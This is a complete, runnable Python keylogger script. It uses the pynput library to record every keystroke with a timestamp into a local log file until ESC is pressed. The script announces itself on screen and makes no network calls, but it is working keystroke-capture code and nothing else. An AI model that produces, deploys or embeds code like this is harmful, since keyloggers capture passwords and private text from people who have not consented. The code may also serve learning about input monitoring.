from pynput import keyboard
import datetime
import os

LOG_FILE = "keylog.txt"
TIMESTAMP_FORMAT = "%Y-%m-%d %H:%M:%S"

def get_timestamp():
    return datetime.datetime.now().strftime(TIMESTAMP_FORMAT)

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f'[{get_timestamp()}] {key.char}\n')
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f'[{get_timestamp()}] {key}\n')

    if key == keyboard.Key.esc:
        print("\nKeylogger stopped by pressing ESC")
        return False

def main():
    print("Starting keylogger")
    print("Press ESC to stop")

    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write(f"Keylogger started at {get_timestamp()}\n")

    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        user_input = input("Enter text: ")
        print("You entered:", user_input)
        listener.join()

    except KeyboardInterrupt:
        print("\nKeylogger stopped by user")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()